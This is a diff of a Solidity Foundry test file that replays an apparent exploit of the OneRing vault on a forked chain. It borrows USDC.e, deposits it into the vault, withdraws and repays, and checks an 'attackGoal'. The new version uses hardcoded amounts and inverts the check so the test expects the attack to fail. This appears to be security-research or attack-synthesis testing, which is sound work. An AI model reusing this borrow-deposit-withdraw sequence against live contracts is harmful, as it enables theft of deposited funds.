@@ -294,21 +294,41 @@ contract OneRingTestBase is Test, BlockLoader {
         vault.withdraw(amount, address(usdce));
     }
 
+    // function test_gt() public {
+    //     vm.startPrank(attacker);
+    //     emit log_named_uint("amt0", 80000000e6);
+    //     borrow_usdce_pair(80000000e6);
+    //     printBalance("After step0 ");
+    //     emit log_named_uint("amt1", 80000000e6);
+    //     deposit_vault_usdce_vault(80000000e6);
+    //     printBalance("After step1 ");
+    //     emit log_named_uint("amt2", vault.balanceOf(attacker));
+    //     withdraw_vault_vault_usdce(vault.balanceOf(attacker));
+    //     printBalance("After step2 ");
+    //     emit log_named_uint("amt3", (80000000e6 * 1003) / 1000);
+    //     payback_usdce_pair((80000000e6 * 1003) / 1000);
+    //     printBalance("After step3 ");
+    //     require(attackGoal(), "Attack failed!");
+    //     vm.stopPrank();
+    // }
+
     function test_gt() public {
+        uint256 amt0 = 0x4c80a608e1;
+        uint256 amt1 = 0x4c80a0c322;
+        uint256 amt2 = 0x247777a83dab62000000;
+        uint256 amt3 = 0x4cbb670ca9;
+
         vm.startPrank(attacker);
-        emit log_named_uint("amt0", 80000000e6);
-        borrow_usdce_pair(80000000e6);
+        vm.assume(amt3 >= amt0);
+        borrow_usdce_owner(amt0);
         printBalance("After step0 ");
-        emit log_named_uint("amt1", 80000000e6);
-        deposit_vault_usdce_vault(80000000e6);
+        deposit_vault_usdce_vault(amt1);
         printBalance("After step1 ");
-        emit log_named_uint("amt2", vault.balanceOf(attacker));
-        withdraw_vault_vault_usdce(vault.balanceOf(attacker));
+        withdraw_vault_vault_usdce(amt2);
         printBalance("After step2 ");
-        emit log_named_uint("amt3", (80000000e6 * 1003) / 1000);
-        payback_usdce_pair((80000000e6 * 1003) / 1000);
+        payback_usdce_owner(amt3);
         printBalance("After step3 ");
-        require(attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
